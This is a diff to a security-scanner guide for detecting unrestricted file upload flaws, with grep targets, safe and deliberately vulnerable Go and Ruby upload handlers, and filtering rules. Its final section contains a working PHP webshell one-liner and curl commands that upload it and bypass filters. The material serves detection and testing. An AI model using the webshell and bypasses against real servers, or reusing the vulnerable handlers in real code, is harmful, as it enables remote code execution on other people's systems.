@@ -7,6 +7,30 @@ description: Detect unrestricted file upload vulnerabilities where attackers can
 
 When an application allows users to upload files without restricting executable types, an attacker can deposit a server-side script (e.g., `.php`, `.py`, `.sh`) into a web-accessible directory and trigger it via an HTTP request to achieve Remote Code Execution. A secondary risk is path traversal through attacker-controlled filenames.
 
+The core pattern: *a user-supplied file reaches a storage location without adequate extension validation, and the stored file is accessible or executable.*
+
+## Class Boundaries
+
+### What it IS
+
+- No extension or content check: `file.save(upload_path)` with no validation
+- Content-Type-only validation — trivially bypassed by setting the header manually
+- Extension blocklist with gaps: `.php` blocked but `.php3`, `.phtml`, `.phar`, `.shtml` not
+- Case-insensitive bypass: blocking `.php` but allowing `.PHP`, `.Php`
+- Double extension: `shell.php.jpg` — last-segment extraction may pass allowlist while Apache executes as PHP
+- Path traversal in filenames: `../../webroot/shell.php` via unsanitized `file.filename` (also overlaps `path_traversal`)
+- Incomplete sanitization: stripping `../` but not `%2e%2e%2f`
+- Uploads stored in a web-executable directory (`static/uploads/`, `public/`, `wwwroot/`)
+
+### What it is NOT (commonly confused with)
+
+- **Stored XSS via SVG/HTML** — embedded `<script>` in an uploaded SVG reflected back; sink is output encoding, not server-side execution
+- **SSRF/XXE via file content** — uploaded XML/SVG triggering outbound requests; separate class
+- **DoS via large files** — missing size limits; availability issue, not execution
+- **IDOR on download** — accessing another user's file without authorization
+- **Path traversal alone** — reading/writing files outside intended dirs without an upload execution chain; tag `path_traversal` when no web-shell deposit is possible
+- **Secure uploads** — outside webroot, UUID rename, allowlist, served via `Content-Disposition: attachment` download endpoint
+
 ## Vulnerable Conditions
 
 Both conditions must hold:
@@ -15,9 +39,42 @@ Both conditions must hold:
 
 ## Safe Patterns
 
-- Explicit extension whitelist: `ALLOWED_EXTENSIONS = {'png', 'jpg', 'gif', 'pdf'}` with enforcement.
-- Files stored outside webroot and never executed.
-- Filename randomized with `uuid4()` and extension stripped.
+When these appear together, the site is likely **not vulnerable**:
+
+- **Extension allowlist** (most important): `ext = filename.rsplit('.', 1)[-1].lower()` then check against `{'png','jpg','jpeg','gif','pdf'}`
+- **Magic-byte / content validation** (defense in depth): read first 2 KB and verify MIME via `magic.from_buffer()` or equivalent — does not replace allowlist
+- **Image re-encoding**: decode and re-encode through Pillow/ImageMagick to strip embedded script/polyglot payloads
+- **Filename sanitization**: `secure_filename()`, `basename()`, `Path.GetFileName()`, `filepath.Base()` — strips path separators
+- **Server-generated name**: `stored = f"{uuid4()}.jpg"` — extension server-controlled, not user-controlled
+- **Storage outside webroot**: `/var/uploads/` not served by the web server; never `static/`, `public/`, `wwwroot/`
+- **Controlled download endpoint**: `send_from_directory(..., as_attachment=True)` or `Content-Disposition: attachment` — prevents in-browser execution
+
+## Recon Indicators
+
+Grep for receive-and-store chains; trace whether validation exists and where the file lands.
+
+**Upload receive patterns (find all sites first)**
+
+| Stack | Grep targets |
+|-------|-------------|
+| Python/Flask | `request\.files`, `file\.save\(`, `FileStorage` |
+| Python/Django | `request\.FILES`, `InMemoryUploadedFile`, `default_storage\.save`, `FileField`, `ImageField` |
+| Node.js | `multer\(`, `upload\.(single\|array\|fields)`, `formidable`, `busboy`, `multiparty`, `req\.files`, `express-fileupload` |
+| PHP | `\$_FILES`, `move_uploaded_file\(`, `copy\(\$_FILES` |
+| Java/Spring | `MultipartFile`, `file\.transferTo\(`, `Part\.write\(`, `Files\.write\(.*getBytes` |
+| Go | `FormFile\(`, `MultipartForm\.File`, `io\.Copy\(.*header\.Filename` |
+| Ruby/Rails | `params\[:file\]`, `has_one_attached`, `mount_uploader`, `CarrierWave` |
+| C#/ASP.NET | `IFormFile`, `CopyToAsync\(`, `HttpPostedFileBase`, `Request\.Files` |
+
+**Dangerous sink chain (flag when present)**
+
+1. User-controlled filename or extension reaches a path join: `os.path.join(UPLOAD, file.filename)`, `Paths.get("uploads/" + file.getOriginalFilename())`, `move_uploaded_file(..., 'uploads/' . $_FILES['file']['name'])`
+2. Storage under web-served or executable dirs: `static/uploads/`, `public/uploads/`, `wwwroot/`, `getServletContext().getRealPath("/")`, `Rails.root.join('public', 'uploads')`
+3. No allowlist visible before save — or only `content_type` / `mimetype` / `$_FILES['type']` checked
+
+**Safe chain (lower priority)**
+
+- Allowlist + `.lower()` on extension + UUID rename + path outside webroot
 
 ---
 
@@ -67,6 +124,58 @@ Both conditions must hold:
 ### Formidable / busboy
 - **VULN**: File saved with original name without extension validation
 - **VULN**: Upload path constructed from user-controlled filename segment
+
+---
+
+## Go Source Detection Rules
+
+```go
+// VULNERABLE: no extension check, stored in static directory
+func uploadHandler(w http.ResponseWriter, r *http.Request) {
+    file, header, _ := r.FormFile("file")
+    defer file.Close()
+    dst, _ := os.Create("static/uploads/" + header.Filename)
+    io.Copy(dst, file)
+}
+
+// SECURE: allowlist + UUID rename + outside web root
+var allowed = map[string]bool{"jpg": true, "jpeg": true, "png": true, "gif": true}
+
+func uploadHandler(w http.ResponseWriter, r *http.Request) {
+    file, header, _ := r.FormFile("file")
+    defer file.Close()
+    ext := strings.ToLower(filepath.Ext(header.Filename))
+    if ext == "" || !allowed[ext[1:]] {
+        http.Error(w, "invalid extension", http.StatusBadRequest)
+        return
+    }
+    stored := "/var/uploads/" + uuid.New().String() + ext
+    dst, _ := os.Create(stored)
+    io.Copy(dst, file)
+}
+```
+
+---
+
+## Ruby / Rails Source Detection Rules
+
+```ruby
+# VULNERABLE: no validation, stored in public/
+def upload
+  file = params[:file]
+  File.open(Rails.root.join('public', 'uploads', file.original_filename), 'wb') do |f|
+    f.write(file.read)
+  end
+end
+
+# SECURE: CarrierWave with extension allowlist
+class AvatarUploader < CarrierWave::Uploader::Base
+  def extension_allowlist
+    %w[jpg jpeg png gif]
+  end
+end
+# Note: ActiveStorage content_type is user-supplied in some configs — validate extension too
+```
 
 ---
 
@@ -169,7 +278,7 @@ $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
 if (!in_array($ext, $blacklist)) {
     move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_DIR . $_FILES['file']['name']);
 }
-// Bypasses: .php5, .php7, .phtml, .phar, .php.jpg (if Apache configured for regex match)
+// Bypasses: .php5, .php7, .phtml, .phar, .PHP (case bypass if no strtolower), .php.jpg (Apache AddHandler)
 
 // Executable extensions in Apache/Nginx context:
 // .php, .php3, .php4, .php5, .php7, .phtml, .phar
@@ -248,3 +357,39 @@ A blacklist missing any of these allows IIS handler execution.
 - Do NOT emit `arbitrary_file_upload` for profile image/avatar upload endpoints that restrict to image types (jpg/png/gif) AND store files outside the webroot or in object storage — the risk is minimal and better categorized as a defense-in-depth gap.
 - Do NOT emit when file type validation (extension whitelist + content-type check + magic byte validation) is present, even if not perfect — flag as LIKELY only if a specific bypass is demonstrable.
 - Do NOT emit for file write operations that are not uploads (e.g., logging, temp files, cache writes) — these should be tagged as `path_traversal` if applicable.
+
+## Dynamic Test / PoC
+
+Confirm with a minimal runtime probe; pair with static analysis of validation and storage path.
+
+**Direct webshell upload (no validation)**
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+curl -X POST "https://app.example.com/upload" -F "file=@shell.php"
+curl -s "https://app.example.com/static/uploads/shell.php?cmd=id"
+# Signal: command output in response body (200 + uid/gid text)
+```
+
+**Content-Type / MIME bypass**
+
+```bash
+curl -X POST "https://app.example.com/upload" \
+  -F "file=@shell.php;type=image/png"
+# Signal: file saved despite non-image content; then request stored URL for execution
+```
+
+**Blocklist / alternate extension bypass**
+
+```bash
+curl -X POST "https://app.example.com/upload" -F "file=@shell.phtml"
+# Signal: 200 on upload + executable response when accessing stored path (try .phtml, .phar, .php5, .PHP)
+```
+
+**Path traversal in filename**
+
+```bash
+curl -X POST "https://app.example.com/upload" \
+  -F "file=@shell.php;filename=../../webroot/shell.php"
+# Signal: file appears outside intended upload dir and is web-accessible
+```
